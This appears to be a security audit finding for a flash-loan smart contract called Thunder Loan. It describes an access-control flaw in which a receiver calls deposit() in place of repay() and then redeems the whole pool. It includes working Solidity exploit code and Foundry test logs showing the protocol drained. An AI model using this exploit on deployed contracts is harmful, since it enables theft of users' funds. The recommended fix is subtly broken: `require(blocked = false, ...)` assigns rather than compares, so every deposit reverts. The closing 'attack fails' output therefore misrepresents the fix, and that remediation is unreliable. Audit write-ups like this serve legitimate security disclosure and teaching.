## [High] Lack of Access Control allows malicious actor to steal funds.

### Severity

High Risk

### Date Modified

Nov 6th, 2023

### Summary

Usually Flash Loans protocols has other options like deposit to earn fees or speculate with token prices. This could lead to vulnerabilities if it is not able to control who and when a user/contract calls these functions.

In this case, any user could call the `deposit()` function at any time. In addition, the way the `flashLoan()` function controls that the loan is repaired is by using this comparative:

Token Balance at the end of the flash Loan > Token Balance at the beginning of the flash Loan (because the fees).

The way that a malicious actor could trick the protocol is calling the `deposit()` function instead the `repair()` fucntion in the callback contract.

1. The flash loan thinks that is repaid because the Token´s current balance is higher than the previous balance.
2. The user has deposited the entire balance of the contract as his own deposit so, now, it is possible to redeem to their EOA account.

### Vulnerability Details (PoC)

1. Add to `IThunderLoan.sol` the `deposit()` and `redeem()` functions

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IThunderLoan {
    function repay(address token, uint256 amount) external;
    function deposit(IERC20 token, uint256 amount) external;
    function redeem(IERC20 token, uint256 amountOfAssetToken) external;
}
```

2. In the mock contract `MockFlashLoanReceiver.sol`, function `executeOperation()`, change the called function `repay()` to the function `deposit()`. We will make a deposit instead of a repayment and the flash loan will be fooled.

Remove this:

```
IThunderLoan(s_thunderLoan).repay(token, amount + fee);
```

Add this

```
IThunderLoan(s_thunderLoan).deposit(IERC20(token), amount + fee);
```

3. Create into `MockFlashLoanReceiver.sol` a `redeem()` function:

```
function redeem(IERC20 _token, uint256 _amountOfAssetToken) external {
        IThunderLoan(s_thunderLoan).redeem(_token, _amountOfAssetToken);
        IERC20(_token).transfer(msg.sender, IERC20(_token).balanceOf(address(this)));
    }
```

4. Time to create the the test (attack):

```
function test_FlashLoanCouldBeFooledUsingDeposit() external setAllowedToken hasDeposits {
        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);

        // 1.- Mint tokenA small amount for fees:
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);

        /* LOGS */
        console.log("*** LOGS BEFORE OPERATIONS ***");
        console.log("user balance:         ", tokenA.balanceOf(user));
        console.log("mockcontract balance:", tokenA.balanceOf(address(mockFlashLoanReceiver)) / 1e18);
        console.log("protocol balance:  ", tokenA.balanceOf(address(asset)) / 1e18);

        // 2.- Store the current protocol amount to steal:
        uint256 protocolTotalBalance = tokenA.balanceOf(address(asset));
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, protocolTotalBalance);

        // 3.- Execute the attack:
        vm.startPrank(user);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, protocolTotalBalance, "");
        uint256 mockFlashLoanReceiverBalance = asset.balanceOf(address(mockFlashLoanReceiver));
        mockFlashLoanReceiver.redeem(tokenA, mockFlashLoanReceiverBalance - calculatedFee);
        vm.stopPrank();

        /* LOGS */
        console.log("*** LOGS AFTER OPERATIONS ***");
        console.log("user balance:      ", tokenA.balanceOf(user) / 1e18);
        console.log("protocol balance:     ", tokenA.balanceOf(address(asset)) / 1e18);

        // 4.- Check:
        // User current balance aprox to protocolTotalBalance + AMOUNT - fees:
        assertGt(tokenA.balanceOf(address(user)), protocolTotalBalance);
        // Protocol balance aprox to 0 + fees:
        assertEq(tokenA.balanceOf(address(asset)) / 1e18, 1);
    }
```

```
➜  2023-11-Thunder-Loan git:(main) ✗ forge test --mt test_FlashLoanCouldBeFooledUsingDeposit -vv
[⠒] Compiling...
[⠔] Compiling 1 files with 0.8.20
[⠒] Solc 0.8.20 finished in 1.38s
Compiler run successful!

Running 1 test for test/unit/ThunderLoanTest.t.sol:ThunderLoanTest
[PASS] test_FlashLoanCouldBeFooledUsingDeposit() (gas: 1349520)
Logs:
  *** LOGS BEFORE OPERATIONS ***
  user balance:          0
  mockcontract balance: 10
  protocol balance:   1000
  *** LOGS AFTER OPERATIONS ***
  user balance:       1008
  protocol balance:      1

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.41ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
➜  2023-11-Thunder-Loan git:(main) ✗
```

### Impact

A malicious user could steal all of the protocol's funds.

### Tools Used

Foundry.

### Recommendations

There are several ways to protect the protocol with different access control policies:

1. Use a struct or mapping to flag/unflag flash loan receiver contracts, denying access during the flashloan transaction.
2. Usually Flash Loan receiver contracts are just that, they have been used exclusively for the Flash Loan, they do not need to access any other function. The protocol could use the Open Zeppelin Access Control library to classify the different types of users/contracts.

As an example, we can control the issue with just one variable:

1. Add to ThuderLoan.sol the variable:

```
bool public blocked;
```

2. Control de `deposit()` with a requiere:

```
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
    require(blocked = false, "deposit is blocked");

    /**** EXECUTE THE DEPOSIT AS IS PROGRAMMED ******/
    }
```

3. Finally, update to true/flase during the `flashLoan()`:

```
function flashloan(address receiverAddress, IERC20 token, uint256 amount, bytes calldata params) external {
        blocked = true;

        /**** EXECUTE THE FLASH LOAN AS IS PROGRAMMED ******/

        blocked = false;
    }

```

We can execute the same attack but now without success:

```
➜  2023-11-Thunder-Loan git:(main) ✗ forge test --mt test_FlashLoanCouldBeFooledUsingDeposit -vv
[⠒] Compiling...
[⠃] Compiling 7 files with 0.8.20
[⠒] Solc 0.8.20 finished in 1.87s
Compiler run successful!

Running 1 test for test/unit/ThunderLoanTest.t.sol:ThunderLoanTest
[FAIL. Reason: deposit is blocked] test_FlashLoanCouldBeFooledUsingDeposit() (gas: 1094786)
Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.45ms

Ran 1 test suites: 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/unit/ThunderLoanTest.t.sol:ThunderLoanTest
[FAIL. Reason: deposit is blocked] test_FlashLoanCouldBeFooledUsingDeposit() (gas: 1094786)

Encountered a total of 1 failing tests, 0 tests succeeded
➜  2023-11-Thunder-Loan git:(main) ✗
```
